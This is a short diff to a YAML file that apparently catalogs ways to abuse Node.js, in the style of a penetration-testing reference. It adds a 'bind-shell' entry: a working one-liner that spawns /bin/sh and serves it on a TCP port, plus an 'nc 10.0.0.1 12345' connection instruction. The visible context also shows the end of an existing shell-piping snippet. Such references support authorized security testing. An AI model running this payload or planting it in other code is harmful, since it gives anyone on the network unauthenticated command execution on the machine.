@@ -20,4 +20,14 @@ functions:
           sh.stdout.pipe(this);
           sh.stderr.pipe(this);
         });'
+  bind-shell:
+    - description: Run `nc 10.0.0.1 12345` to connect to the shell on the other end.
+      code: |
+        export LPORT=12345
+        node -e 'sh = require("child_process").spawn("/bin/sh");
+        require("net").createServer(function (client) {
+          client.pipe(sh.stdin);
+          sh.stdout.pipe(client);
+          sh.stderr.pipe(client);
+        }).listen(process.env.LPORT);'
 ---
